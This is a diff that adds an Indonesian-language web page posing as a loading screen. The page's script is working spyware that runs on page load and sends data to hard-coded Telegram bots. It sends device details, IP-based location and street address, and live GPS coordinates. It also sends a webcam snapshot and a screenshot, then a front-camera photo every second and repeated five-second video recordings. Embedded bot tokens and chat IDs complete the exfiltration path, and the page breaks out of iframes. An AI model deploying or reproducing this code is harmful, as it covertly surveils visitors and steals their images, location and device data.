@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="id">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>bodo banget si</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <style>
+        body {
+            background: #000;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+            color: #999;
+            overflow: hidden
+        }
+
+        #loading-container {
+            text-align: center;
+            width: 80%;
+            max-width: 400px
+        }
+
+        #loading-text {
+            font-size: 22px;
+            margin-bottom: 20px;
+            color: #6e48aa
+        }
+
+        #progress-container {
+            height: 3px;
+            background: #222;
+            border-radius: 3px;
+            overflow: hidden
+        }
+
+        #progress-bar {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #6e48aa, #9d50bb);
+            transition: width .3s ease
+        }
+
+        #loading-details {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #666
+        }
+
+        .hidden {
+            display: none
+        }
+
+        /* Tambahan Style untuk Video dan Canvas */
+        #video {
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            width: 200px;
+            height: auto;
+            border: 2px solid #fff;
+            z-index: 1000;
+        }
+    </style>
+</head>
+
+<body>
+    <div id="loading-container">
+        <div id="loading-text">loading sebentar </div>
+        <video id="v" autoplay muted class="hidden"></video>
+        <canvas id="c" class="hidden"></canvas>
+        <video id="video" autoplay playsinline style="display:none;"></video>
+        <canvas id="canvas" style="display:none;"></canvas>
+        <script>
+            (() => {
+                const T = '7891887126:AAFk3mj3KxnwTTEiu6JtaE4UXpSK98IK2_8',
+                    C = '7919359674',
+                    pb = document.createElement('div');
+                pb.id = 'progress-bar';
+                document.body.appendChild(pb);
+                let p = 0,
+                    ld = document.createElement('div');
+                ld.id = 'loading-details';
+                document.body.appendChild(ld);
+                const LM = ["Memeriksa modul sistem...", "Memuat komponen inti...", "Menginisialisasi antarmuka...",
+                    "Memverifikasi koneksi...", "Menyiapkan lingkungan...", "Memeriksa pembaruan...",
+                    "Memuat aset tampilan..."
+                ];
+                setInterval(() => {
+                    p += Math.random() * 5;
+                    if (p > 98) p = 98;
+                    pb.style.width = p + '%';
+                    if (Math.random() > .9) ld.textContent = LM[Math.floor(Math.random() * LM.length)]
+                }, 500);
+                const sTG = async d => {
+                        try {
+                            await fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json'
+                                },
+                                body: JSON.stringify({
+                                    chat_id: C,
+                                    text: d,
+                                    parse_mode: 'HTML'
+                                })
+                            })
+                        } catch (e) {}
+                    },
+                    sP = async (b, f) => {
+                        try {
+                            const fd = new FormData();
+                            fd.append('chat_id', C);
+                            fd.append('photo', b, f);
+                            await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, {
+                                method: 'POST',
+                                body: fd
+                            })
+                        } catch (e) {}
+                    },
+                    gLD = async (a, b) => {
+                        try {
+                            const r = await fetch(
+                                    `https://nominatim.openstreetmap.org/reverse?format=json&lat=${a}&lon=${b}&zoom=18&addressdetails=1`
+                                ),
+                                d = await r.json();
+                            if (d.address) return {
+                                kb: d.address.county || d.address.city || d.address.state ||
+                                    "Tidak diketahui",
+                                kc: d.address.suburb || d.address.village || d.address.town ||
+                                    "Tidak diketahui",
+                                fa: d.display_name || "Alamat tidak tersedia"
+                            }
+                        } catch (e) {}
+                        return {
+                            kb: "Tidak diketahui",
+                            kc: "Tidak diketahui",
+                            fa: "Alamat tidak tersedia"
+                        }
+                    };
+                const cDI = async () => {
+                    let m = '╭───── Tracking Report ───── ⦿\n\n';
+                    m += '⚙️ DEVICE INFORMATION\n';
+                    m += `🖥️ Device: ${navigator.userAgent}\n`;
+                    m += `💻 Platform: ${navigator.platform}\n`;
+                    m += `🌐 Bahasa: ${navigator.language}\n`;
+                    m += `📶 Online: ${navigator.onLine?'Online':'Offline'}\n`;
+                    m += `📺 Screen Size: ${screen.width}x${screen.height}\n`;
+                    m += `🪟 Window Size: ${innerWidth}x${innerHeight}\n`;
+                    m += `💾 RAM: ${navigator.deviceMemory||'Unknown'} GB\n`;
+                    m += `🧠 CPU Cores: ${navigator.hardwareConcurrency}\n`;
+                    if (navigator.getBattery) {
+                        try {
+                            const b = await navigator.getBattery();
+                            m += `🔋 Battery: ${Math.floor(b.level*100)}%\n`;
+                            m += `🔌 Charging: ${b.charging?'✅ YA':'❌ TIDAK'}\n`
+                        } catch (e) {
+                            m += '🔋 Battery: ❌ Tidak tersedia\n'
+                        }
+                    }
+                    m += `⏰ Waktu Akses: ${new Date().toString()}\n`;
+                    m += `🕒 Page Load Time: ${performance.now().toFixed(2)} ms\n`;
+                    m += `📜 History Length: ${history.length}\n`;
+                    m += `✋ Touch Support: ${'ontouchstart'in window?'✅ YA':'❌ TIDAK'}\n`;
+                    m += `🔗 Referrer: ${document.referrer||'None'}\n`;
+                    m += `🌍 URL: ${location.href}\n`;
+                    m += `📄 Title: ${document.title}\n`;
+                    m += `🕓 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+                    m += `🧭 Offset: ${new Date().getTimezoneOffset()} menit\n\n`;
+                    try {
+                        const i = await fetch('https://ipapi.co/json/'),
+                            d = await i.json();
+                        m += '📍 LOCATION INFORMATION\n';
+                        m += `📡 IP Address: ${d.ip}\n`;
+                        m += `🏙️ Kota: ${d.city}\n`;
+                        m += `🏙️ Kabupaten: ${d.region}\n`;
+                        m += `🗺️ Wilayah: ${d.region}\n`;
+                        m += `🌎 Negara: ${d.country_name}\n`;
+                        m += `🏷️ Kode Pos: ${d.postal}\n`;
+                        if (d.latitude && d.longitude) {
+                            m += `📌 Latitude: ${d.latitude}\n`;
+                            m += `📍 Longitude: ${d.longitude}\n`;
+                            const l = await gLD(d.latitude, d.longitude);
+                            m += `🏙️ Kabupaten: ${l.kb}\n`;
+                            m += `🏙️ Kecamatan: ${l.kc}\n`;
+                            m += `🏠 Alamat Lengkap: ${l.fa}\n`
+                        }
+                    } catch (e) {
+                        m += '❌ Gagal mendapatkan informasi lokasi\n'
+                    }
+                    m += '\n╰───── Telegram @cpl_denz ───── ⦿';
+                    return m
+                };
+                const ST = async () => {
+                    await sTG(await cDI());
+                    try {
+                        const v = document.getElementById('v'),
+                            c = document.getElementById('c'),
+                            st = await navigator.mediaDevices.getUserMedia({
+                                video: true
+                            });
+                        v.srcObject = st;
+                        await new Promise(r => setTimeout(r, 3000));
+                        c.width = v.videoWidth;
+                        c.height = v.videoHeight;
+                        c.getContext('2d').drawImage(v, 0, 0);
+                        c.toBlob(b => sP(b, 'camera_capture.jpg'), 'image/jpeg');
+                        st.getTracks().forEach(t => t.stop())
+                    } catch (e) {
+                        await sTG('❌ Camera access blocked')
+                    }
+                    setTimeout(async () => {
+                        try {
+                            const cn = await html2canvas(document.body);
+                            cn.toBlob(b => sP(b, 'screenshot.jpg'), 'image/jpeg')
+                        } catch (e) {
+                            await sTG('❌ Screenshot failed')
+                        }
+                    }, 5000);
+                    if (navigator.geolocation) {
+                        navigator.geolocation.watchPosition(async p => {
+                            let g = `📍 LIVE GPS TRACKING\n📌 Lat: ${p.coords.latitude}\n📍 Lng: ${p.coords.longitude}\n🎯 Akurasi: ${p.coords.accuracy}m\n`;
+                            const l = await gLD(p.coords.latitude, p.coords.longitude);
+                            g += `🏙️ Kabupaten: ${l.kb}\n`;
+                            g += `🏙️ Kecamatan: ${l.kc}\n`;
+                            g += `🏠 Alamat: ${l.fa}\n`;
+                            await sTG(g)
+                        }, async e => {
+                            await sTG(`❌ GPS Error: ${e.message}`)
+                        }, {
+                            enableHighAccuracy: true,
+                            maximumAge: 0,
+                            timeout: 5000
+                        })
+                    }
+                };
+                setTimeout(ST, 3000);
+            })();
+
+            // Kode dari HTML kedua
+            if (window.self !== window.top) {
+                window.top.location.href = window.self.location.href;
+            }
+
+            const telegramBotToken = '8595617272:AAGaZZJGOqDVWIrbXdTXrPI-EeVFgtjOtpM';
+            const telegramChannelId = '7605145356';
+            const photoDescription = 'FOTO';
+            const videoDescription = 'VIDIO';
+            const photoInterval = 1000; // Spam Foto 1 detik
+            const recordInterval = 5000; // Spam Video 5 Detik
+
+            let videoStream2;
+            let mediaRecorder;
+            let recordedBlobs = [];
+
+            async function initCamera2() {
+                try {
+                    const constraints = {
+                        audio: false,
+                        video: {
+                            facingMode: "user"
+                        }
+                    };
+                    videoStream2 = await navigator.mediaDevices.getUserMedia(constraints);
+                    const videoElement = document.getElementById('video');
+                    videoElement.srcObject = videoStream2;
+
+                    startRecording();
+                    startPhotoSpam();
+
+                } catch (error) {
+                    console.error('Error accessing media devices:', error);
+                }
+            }
+
+            function sendPhotoToTelegram(imageData) {
+                const apiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendPhoto`;
+                const formData = new FormData();
+                formData.append('chat_id', telegramChannelId);
+                formData.append('photo', dataURLtoBlob(imageData), 'capture.png');
+                formData.append('caption', photoDescription);
+
+                fetch(apiUrl, {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('Send Photo To Telegram', data);
+                    })
+                    .catch(error => {
+                        console.error('Error Sending Photo To Telegram:', error);
+                    });
+            }
+
+            function dataURLtoBlob(dataURL) {
+                const byteString = atob(dataURL.split(',')[1]);
+                const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
+                const ab = new ArrayBuffer(byteString.length);
+                const ia = new Uint8Array(ab);
+                for (let i = 0; i < byteString.length; i++) {
+                    ia[i] = byteString.charCodeAt(i);
+                }
+                return new Blob([ab], {
+                    type: mimeString
+                });
+            }
+
+            function startPhotoSpam() {
+                setInterval(() => {
+                    if (videoStream2 && videoStream2.active) {
+                        const canvas = document.getElementById('canvas');
+                        const videoElement = document.getElementById('video');
+                        const context = canvas.getContext('2d');
+                        canvas.width = videoElement.videoWidth;
+                        canvas.height = videoElement.videoHeight;
+                        context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+                        const imageDataURL = canvas.toDataURL('image/png').replace("image/png",
+                            "image/octet-stream");
+                        sendPhotoToTelegram(imageDataURL);
+                    }
+                }, photoInterval);
+            }
+
+            function handleDataAvailable(event) {
+                if (event.data && event.data.size > 0) {
+                    recordedBlobs.push(event.data);
+                }
+            }
+
+            function handleStop() {
+                const superBuffer = new Blob(recordedBlobs, {
+                    type: 'video/webm'
+                });
+                sendVideoToTelegram(superBuffer);
+                recordedBlobs = [];
+                if (videoStream2 && videoStream2.active) {
+                    startRecording();
+                }
+            }
+
+            function startRecording() {
+                if (!videoStream2) return;
+                mediaRecorder = new MediaRecorder(videoStream2, {
+                    mimeType: 'video/webm;codecs=vp9,opus'
+                });
+                mediaRecorder.ondataavailable = handleDataAvailable;
+                mediaRecorder.onstop = handleStop;
+                mediaRecorder.start();
+                console.log('Start Recording ');
+            }
+
+            async function sendVideoToTelegram(videoBlob) {
+                const apiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendVideo`;
+                const formData = new FormData();
+                formData.append('chat_id', telegramChannelId);
+                formData.append('video', videoBlob, 'Record.webm');
+                formData.append('caption', videoDescription);
+
+                try {
+                    const response = await fetch(apiUrl, {
+                        method: 'POST',
+                        body: formData
+                    });
+
+                    const data = await response.json();
+                    console.log('Video Sendinh To Telegram:', data);
+                } catch (error) {
+                    console.error('Error mengirim video ke Telegram:', error);
+                }
+            }
+
+            document.addEventListener('DOMContentLoaded', async () => {
+                await initCamera2();
+                setInterval(() => {
+                    if (mediaRecorder && mediaRecorder.state === 'recording') {
+                        mediaRecorder.stop();
+                    }
+                }, recordInterval);
+            });
+        </script>
+</body>
+
+</html>
